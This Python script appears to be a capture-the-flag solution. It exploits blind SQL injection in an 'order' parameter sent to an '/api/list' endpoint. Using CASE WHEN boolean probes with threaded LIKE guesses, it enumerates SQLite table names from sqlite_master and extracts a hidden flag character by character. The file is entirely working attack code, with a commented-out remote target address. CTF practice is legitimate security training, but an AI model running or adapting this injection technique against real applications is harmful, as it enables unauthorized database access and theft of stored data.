import requests
import json
import string
import threading
import sys
import time

TARGET_URL = 'http://localhost:1337'
#TARGET_URL = 'http://138.68.141.182:32260'

CURSOR_UP_ONE = '\033[F' 
ERASE_LINE = '\033[K' 

def req(pay,debug):
    if(debug):
        print(pay,end="\r")
        sys.stdout.write(pay+"\r")
        sys.stdout.flush()
        sys.stdout.write(ERASE_LINE)
        #time.sleep(10)
    a = requests.post(TARGET_URL + '/api/list', json = {
        "order":"(CASE WHEN "+pay+" THEN id ELSE count END)",
    })
    print(a.text)
    id=json.loads(a.text)[0]['id']
    return id==1

class TableNameThread(threading.Thread):
    def __init__(self,threadID,name,n):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.n=n
        self.ch=" "
    
    def run(self):
        self.ch = getTableNameChar(self.n)

class FlagThread(threading.Thread):
    def __init__(self,threadID,name,n,flag_table):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.n=n
        self.ch=" "
        self.flag_table=flag_table
    
    def run(self):
        self.ch = getFlagChar(self.flag_table,self.n)

def getTableNameChar(n):
    charset=string.ascii_lowercase+string.digits
    payload="(SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name like 'flag_%') like 'flag/_"+n*"_"+"{ch}%' ESCAPE '/'"
    for ch in charset:
        if(req(payload.format(ch = ch),True)==True):
            return ch

def getTableName():

    threads=list()
    for i in range(0,10):
        threads.append(TableNameThread(i,"TableNameThread_"+str(i),i))
        threads[i].start()

    result=""
    for i in range(0,10):
        threads[i].join()
        result=result+threads[i].ch
    return("flag_"+result)

def getFlagLength(flag_table):
    i=0
    res=False
    payload="(SELECT LENGTH(flag) FROM "+flag_table+")={}"
    while(not res):
        i=i+1
        res=req(payload.format(i),True)
    return i

def getFlagChar(flag_table,n):
    charset=string.ascii_lowercase+string.ascii_uppercase+string.digits+"{"+"}"+"_"
    payload="(SELECT flag FROM "+flag_table+") LIKE binary '"+n*"_"+"{ch}%' ESCAPE '/'"

    for ch in charset:
        if(ch=="_" or ch=="%" or ch=="\"" or ch=="\'" or ch=="/" or ch=="$"):
            ch="/"+ch
        if(req(payload.format(ch = ch),True)==True):
            if(ch=="/_" or ch=="/%" or ch=="/\"" or ch=="/\'" or ch=="//" or ch=="/$"):
                ch=ch[1]
            return ch

def getFlag():
    flag_table=getTableName()
    l=getFlagLength(flag_table)
    threads=list()
    for i in range(0,l):
        threads.append(FlagThread(i,"TableNameThread_"+str(i),i,flag_table))
        threads[i].start()

    result=""
    for i in range(0,l):
        threads[i].join()
        result=result+threads[i].ch
    return(result)

print(getFlag())
#payload="(SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name like 'flag_%') like 'flag_%'"
#print(req(payload))